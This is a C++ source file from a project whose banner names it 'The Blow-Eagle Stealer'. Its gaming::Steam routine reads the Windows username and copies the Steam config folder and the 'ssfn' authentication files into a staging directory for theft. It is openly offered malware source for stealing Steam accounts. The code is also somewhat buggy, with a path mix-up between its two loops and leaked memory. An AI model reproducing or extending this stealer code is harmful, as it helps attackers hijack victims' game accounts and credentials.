/*
|==================================================================================================================|
|████████╗██╗░░██╗███████╗  ██████╗░██╗░░░░░░█████╗░░██╗░░░░░░░██╗░░░░░░███████╗░█████╗░░██████╗░██╗░░░░░███████╗ |
|╚══██╔══╝██║░░██║██╔════╝  ██╔══██╗██║░░░░░██╔══██╗░██║░░██╗░░██║░░░░░░██╔════╝██╔══██╗██╔════╝░██║░░░░░██╔════╝ |
|░░░██║░░░███████║█████╗░░  ██████╦╝██║░░░░░██║░░██║░╚██╗████╗██╔╝█████╗█████╗░░███████║██║░░██╗░██║░░░░░█████╗░░ |
|░░░██║░░░██╔══██║██╔══╝░░  ██╔══██╗██║░░░░░██║░░██║░░████╔═████║░╚════╝██╔══╝░░██╔══██║██║░░╚██╗██║░░░░░██╔══╝░░ |
|░░░██║░░░██║░░██║███████╗  ██████╦╝███████╗╚█████╔╝░░╚██╔╝░╚██╔╝░░░░░░░███████╗██║░░██║╚██████╔╝███████╗███████╗ |
|░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═════╝░╚══════╝░╚════╝░░░░╚═╝░░░╚═╝░░░░░░░░╚══════╝╚═╝░░╚═╝░╚═════╝░╚══════╝╚══════╝ |
|                                                                                                                  |
|                               ░██████╗████████╗███████╗░█████╗░██╗░░░░░███████╗██████╗░                          |
|                               ██╔════╝╚══██╔══╝██╔════╝██╔══██╗██║░░░░░██╔════╝██╔══██╗                          |
|                               ╚█████╗░░░░██║░░░█████╗░░███████║██║░░░░░█████╗░░██████╔╝                          |
|                               ░╚═══██╗░░░██║░░░██╔══╝░░██╔══██║██║░░░░░██╔══╝░░██╔══██╗                          |
|                               ██████╔╝░░░██║░░░███████╗██║░░██║███████╗███████╗██║░░██║                          |
|                               ╚═════╝░░░░╚═╝░░░╚══════╝╚═╝░░╚═╝╚══════╝╚══════╝╚═╝░░╚═╝                          |
|													by: Nick_Vinesmoke											   |
|											https://github.com/Nick-Vinesmoke									   |
|									https://github.com/Nick-Vinesmoke/The-Blow-Eagle							   |
|==================================================================================================================|
*/

#include "../targets.h"
#include "../../config/config.h"
#include <Lmcons.h>
#include <Windows.h>
#include <string.h>
#include <direct.h>
#include <filesystem>

std::string GetUser()
{
	TCHAR s[UNLEN + 1];
	DWORD sizethis = UNLEN + 1;
	GetUserName((TCHAR*)s, &sizethis);
	std::wstring ws(s);
	std::string userName(ws.begin(), ws.end());
	return userName;
}

void copyDirectory(const std::filesystem::path& sourceDir, const std::filesystem::path& destinationDir) {
	try 
	{
		// Create the destination directory if it doesn't exist
		std::filesystem::create_directory(destinationDir);

		// Iterate over the files and directories in the source directory
		for (const auto& entry : std::filesystem::directory_iterator(sourceDir)) {
			const auto& path = entry.path();

			// Construct the corresponding path in the destination directory
			const auto& destinationPath = destinationDir / path.filename();

			// Check if the current entry is a directory
			if (std::filesystem::is_directory(path)) {
				// Recursively copy the directory
				copyDirectory(path, destinationPath);
			}
			else {
				// Copy the file
				std::filesystem::copy_file(path, destinationPath);
			}
		}
	}
	catch (const std::filesystem::filesystem_error& ex) {
		std::cerr << "Failed to copy directory: " << ex.what() << std::endl;
	}
}

void copyFile(const std::string& sourcePath, const std::string& destinationPath) {
	try {
		// Copy the file
		std::filesystem::copy(sourcePath, destinationPath, std::filesystem::copy_options::overwrite_existing);
	}
	catch (const std::filesystem::filesystem_error& ex) {
		std::cerr << "Failed to copy file: " << ex.what() << std::endl;
	}
}

void GetFilesInDir(std::string directoryPath, std::string*& arr, int& arrSize)
{

	try {
		for (const auto& entry : std::filesystem::directory_iterator(directoryPath)) {
			if (std::filesystem::is_regular_file(entry)) {
				std::string* arr2 = new std::string[arrSize + 1];
				for (size_t i = 0; i < arrSize; i++)
				{
					arr2[i] = arr[i];
				}
				arr2[arrSize] = entry.path().filename().string();
				arrSize++;
				arr = new std::string[arrSize];
				for (size_t i = 0; i < arrSize; i++)
				{
					arr[i] = arr2[i];
				}
				delete[] arr2;
			}
		}
	}
	catch (const std::filesystem::filesystem_error& ex) {
		std::cerr << "Error accessing directory: " << ex.what() << std::endl;
	}
}


void gaming::Steam()
{
	printf("steam\n");

	std::string files[] = {
		"C:/Program Files/Steam",
		"C:/Program Files (x86)/Steam",
	};
	std::string dirs[] = {
		"C:/Program Files/Steam/config",
		"C:/Program Files (x86)/Steam/config"
	};

	std::string user = GetUser();

	std::string defaultPaths[3] = {

		"C:/Users/" + user + config::path + "/Games",
		"C:/Users/" + user + config::path + "/Games/Steam",
		"C:/Users/" + user + config::path + "/Games/Steam/config"

	};

	try 
	{
		for (size_t i = 0; i < std::size(defaultPaths); i++)
		{
			int result = _mkdir(defaultPaths[i].c_str());
		}

		try 
		{
			int arrSize = 0;
			std::string* filesInDir = new std::string[arrSize];
			GetFilesInDir(files[0], filesInDir, arrSize);

			copyDirectory(dirs[0],defaultPaths[2]);
			for (size_t i = 0; i < arrSize; i++)
			{
				if (!filesInDir[i].find("ssfn")) {
					copyFile(files[1] + '/' + filesInDir[i], defaultPaths[1]);
				}
			}
		}
		catch (const char* error_message)
		{
			std::cout << error_message << std::endl;
		}

		try
		{
			int arrSize = 0;
			std::string* filesInDir = new std::string[arrSize];
			GetFilesInDir(files[1], filesInDir, arrSize);

			copyDirectory(dirs[1], defaultPaths[2]);
			for (size_t i = 0; i < arrSize; i++)
			{
				if (!filesInDir[i].find("ssfn")) {
					copyFile(files[1] + '/' + filesInDir[i], defaultPaths[1]);
				}
					
			}
		}
		catch (const char* error_message)
		{
			std::cout << error_message << std::endl;
		}

	}
	catch (const char* error_message)
	{
		std::cout << error_message << std::endl;
	}

}